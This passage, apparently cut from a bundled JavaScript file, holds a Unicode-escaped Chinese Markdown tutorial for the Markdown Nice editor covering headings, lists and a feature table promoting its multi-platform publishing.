\u8bed\u6cd5\u901f\u67e5\\n\\n### 3.1 \u6807\u9898\\n\\n\u4f7f\u7528 `#` \u7b26\u53f7\u6765\u521b\u5efa\u6807\u9898\uff1a\\n\\n```markdown\\n# \u4e00\u7ea7\u6807\u9898\\n## \u4e8c\u7ea7\u6807\u9898\\n### \u4e09\u7ea7\u6807\u9898\\n```\\n\\n### 3.2 \u65e0\u5e8f\u5217\u8868\\n\\n\u5728 `-` \u540e\u52a0\u7a7a\u683c\u4f7f\u7528\uff1a\\n\\n- \u65e0\u5e8f\u5217\u8868 1\\n- \u65e0\u5e8f\u5217\u8868 2\\n- \u65e0\u5e8f\u5217\u8868 3\\n\\n\u63a7\u5236\u5c42\u7ea7\u9700\u8981\u5728 `-` \u524d\u6dfb\u52a0\u7a7a\u683c\uff1a\\n\\n- \u65e0\u5e8f\u5217\u8868 1\\n- \u65e0\u5e8f\u5217\u8868 2\\n  - \u65e0\u5e8f\u5217\u8868 2.1\\n  - \u65e0\u5e8f\u5217\u8868 2.2\\n\\n:::warning \u6ce8\u610f\\n\u7531\u4e8e\u5fae\u4fe1\u9650\u5236\uff0c\u6700\u591a\u652f\u6301\u5230\u4e8c\u7ea7\u5217\u8868\u3002\\n:::\\n\\n### 3.3 \u6709\u5e8f\u5217\u8868\\n\\n\u4f7f\u7528\u6570\u5b57\u52a0 `.` \u540e\u7a7a\u683c\uff1a\\n\\n1. \u6709\u5e8f\u5217\u8868 1\\n2. \u6709\u5e8f\u5217\u8868 2\\n3. \u6709\u5e8f\u5217\u8868 3\\n\\n## 4. \u4e3a\u4ec0\u4e48\u9009\u62e9 Markdown Nice\uff1f\\n\\n| \u7279\u6027 | \u8bf4\u660e |\\n|-----|------|\\n| \u591a\u5e73\u53f0\u652f\u6301 | \u5fae\u4fe1\u516c\u4f17\u53f7\u3001\u77e5\u4e4e\u3001\u6398\u91d1\u4e00\u952e\u9002\u914d |\\n| \u4e3b\u9898\u4e30\u5bcc | \u6570\u5341\u79cd\u7cbe\u7f8e\u4e3b\u9898\u53ef\u4f9b\u9009\u62e9 |\\n| \u5b9e\u65f6\u9884\u89c8 | \u6240\u89c1\u5373\u6240\u5f97\u7684\u7f16\u8f91\u4f53\u9a8c |\\n| \u4ee3\u7801\u9ad8\u4eae | \u652f\u6301\u591a\u79cd\u7f16\u7a0b\u8bed\u8a00\u8bed\u6cd5\u9ad8\u4eae |\\n\\n---\\n\\n\u5982\u679c\u4f60\u7ecf\u5e38\u9700\u8981\u5728\u591a\u4e2a\u5e73\u53f0\u53d1\u5e03\u6587\u7ae0\uff0cMarkdown Nice \u7edd\u5bf9\u662f\u4f60\u7684\u4e0d\u4e8c\u4e4b\u9009\uff01"}]}}')}}]);